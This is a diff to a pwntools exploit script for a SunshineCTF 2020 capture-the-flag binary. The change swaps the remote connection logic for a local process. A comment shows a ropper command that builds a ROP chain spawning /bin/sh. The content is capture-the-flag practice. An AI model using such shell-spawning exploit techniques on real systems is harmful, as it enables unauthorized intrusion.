@@ -3,12 +3,7 @@ from pwn import *
 binary = context.binary = ELF('./chall_14')
 context.log_level = 'INFO'
 
-if not args.REMOTE:
-    context.log_file = 'local.log'
-    p = process(binary.path)
-else:
-    context.log_file = 'remote.log'
-    p = remote('chal.2020.sunshinectf.org', 30014)
+p = process('./chall_14')
 
 #ropper --file chall_14 --chain "execve cmd=/bin/sh" --badbytes 0a
 IMAGE_BASE_0 = binary.address
